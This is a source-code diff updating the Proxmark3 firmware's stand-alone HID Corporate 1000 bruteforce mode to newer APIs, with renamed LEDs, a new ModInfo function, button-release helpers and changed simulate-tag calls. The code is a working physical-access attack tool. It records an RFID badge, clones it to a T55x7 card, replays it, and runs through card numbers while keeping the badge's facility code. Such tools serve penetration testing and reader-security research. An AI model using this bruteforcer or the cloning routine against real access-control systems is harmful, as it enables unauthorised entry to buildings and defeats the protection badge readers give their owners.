@@ -10,7 +10,7 @@
 //
 // PROXMARK3 - HID CORPORATE 1000 BRUTEFORCER (STAND-ALONE MODE)
 //
-// This version of Proxmark3 firmware adds one extra stand-alone mode to proxmark3 firmware.
+// This version of Proxmark3 firmware adds one extra stand-alone mode.
 // The new stand-alone mode allows to execute a bruteforce on HID Corporate 1000 readers, by
 // reading a specific badge and bruteforcing the Card Number (incrementing and decrementing it),
 // mainteining the same Facility Code of the original badge.
@@ -24,7 +24,22 @@
 //-----------------------------------------------------------------------------------
 // main code for LF aka HID corporate brutefore by Federico Dotta & Maurizio Agazzini
 //-----------------------------------------------------------------------------------
+#include "standalone.h" // standalone definitions
 #include "lf_hidbrute.h"
+
+#include "proxmark3_arm.h"
+#include "appmain.h"
+#include "fpgaloader.h"
+#include "util.h"
+#include "dbprint.h"
+#include "ticks.h"
+#include "lfops.h"
+
+#define OPTS 3
+
+void ModInfo(void) {
+    DbpString("  LF HID corporate 1000 bruteforce - aka Corporatebrute (Federico dotta & Maurizio Agazzini)");
+}
 
 // samy's sniff and repeat routine for LF
 void RunMod() {
@@ -37,34 +52,28 @@ void RunMod() {
     int playing = 0;
     int cardRead = 0;
 
-    // Turn on selected LED
-    LED(selected + 1, 0);
-
     for (;;) {
+
         WDT_HIT();
 
         // exit from SamyRun,   send a usbcommand.
-        if (usb_poll_validate_length()) break;
+        if (data_available()) break;
 
         // Was our button held down or pressed?
-        int button_pressed = BUTTON_HELD(1000);
-        SpinDelay(300);
+        int button_pressed = BUTTON_HELD(280);
+        if (button_pressed != BUTTON_HOLD)
+            continue;
 
         // Button was held for a second, begin recording
-        if (button_pressed > 0 && cardRead == 0) {
+        if (cardRead == 0) {
             LEDsoff();
             LED(selected + 1, 0);
-            LED(LED_RED2, 0);
+            LED(LED_D, 0);
+
+            WAIT_BUTTON_RELEASED();
 
             // record
             DbpString("[=] starting recording");
-
-            // wait for button to be released
-            while (BUTTON_PRESS())
-                WDT_HIT();
-
-            /* need this delay to prevent catching some weird data */
-            SpinDelay(500);
 
             CmdHIDdemodFSK(1, &high[selected], &low[selected], 0);
             Dbprintf("[=] recorded %x %x %08x", selected, high[selected], low[selected]);
@@ -79,17 +88,12 @@ void RunMod() {
         } else if (button_pressed > 0 && cardRead == 1) {
             LEDsoff();
             LED(selected + 1, 0);
-            LED(LED_ORANGE, 0);
+            LED(LED_A, 0);
 
             // record
             Dbprintf("[=] cloning %x %x %08x", selected, high[selected], low[selected]);
 
-            // wait for button to be released
-            while (BUTTON_PRESS())
-                WDT_HIT();
-
-            /* need this delay to prevent catching some weird data */
-            SpinDelay(500);
+            WAIT_BUTTON_RELEASED();
 
             CopyHIDtoT55x7(0, high[selected], low[selected], 0);
             Dbprintf("[=] cloned %x %x %08x", selected, high[selected], low[selected]);
@@ -118,15 +122,13 @@ void RunMod() {
             // Begin transmitting
             if (playing && selected != 2) {
 
-                LED(LED_GREEN, 0);
+                LED(LED_B, 0);
                 DbpString("[=] playing");
 
-                // wait for button to be released
-                while (BUTTON_PRESS())
-                    WDT_HIT();
+                WAIT_BUTTON_RELEASED();
 
                 Dbprintf("[=] %x %x %08x", selected, high[selected], low[selected]);
-                CmdHIDsimTAG(high[selected], low[selected], 0);
+                CmdHIDsimTAG(0, high[selected], low[selected], 0, 0);
                 DbpString("[=] done playing");
 
                 if (BUTTON_HELD(1000) > 0)
@@ -151,20 +153,19 @@ void RunMod() {
                     continue;
                 }
 
-                LED(LED_GREEN, 0);
+                LED(LED_B, 0);
                 DbpString("[=] entering bruteforce mode");
-                // wait for button to be released
-                while (BUTTON_PRESS())
-                    WDT_HIT();
+
+                WAIT_BUTTON_RELEASED();
 
                 // Calculate Facility Code and Card Number from high and low
                 uint32_t cardnum = (low[selected] >> 1) & 0xFFFFF;
                 uint32_t fc = ((high[selected] & 1) << 11) | (low[selected] >> 21);
                 uint32_t original_cardnum = cardnum;
 
-                Dbprintf("[=] Proxbrute - starting decrementing card number");
+                Dbprintf("[=] HID brute - starting decrementing card number");
 
-                while (cardnum >= 0) {
+                while (cardnum > 0) {
 
                     // Needed for exiting from proxbrute when button is pressed
                     if (BUTTON_PRESS()) {
@@ -187,12 +188,12 @@ void RunMod() {
                     // Print actual code to brute
                     Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high[selected], low[selected], (low[selected] >> 1) & 0xFFFF, fc, cardnum);
 
-                    CmdHIDsimTAGEx(high[selected], low[selected], 1, 50000);
+                    CmdHIDsimTAGEx(0, high[selected], low[selected], 0, 1, 50000);
                 }
 
                 cardnum = original_cardnum;
 
-                Dbprintf("[=] Proxbrute - starting incrementing card number");
+                Dbprintf("[=] HID brute - starting incrementing card number");
 
                 while (cardnum <= 0xFFFFF) {
 
@@ -215,7 +216,7 @@ void RunMod() {
                     // Print actual code to brute
                     Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high[selected], low[selected], (low[selected] >> 1) & 0xFFFF, fc, cardnum);
 
-                    CmdHIDsimTAGEx(high[selected], low[selected], 1, 50000);
+                    CmdHIDsimTAGEx(0, high[selected], low[selected], 0, 1, 50000);
                 }
 
                 DbpString("[=] done bruteforcing");
@@ -232,13 +233,13 @@ void RunMod() {
                 LED(selected + 1, 0);
 
             } else {
-                while (BUTTON_PRESS())
-                    WDT_HIT();
+                WAIT_BUTTON_RELEASED();
             }
         }
     }
 
 out:
+    SpinErr((LED_A | LED_B | LED_C | LED_D), 250, 5);
     DbpString("[=] exiting");
     LEDsoff();
 }
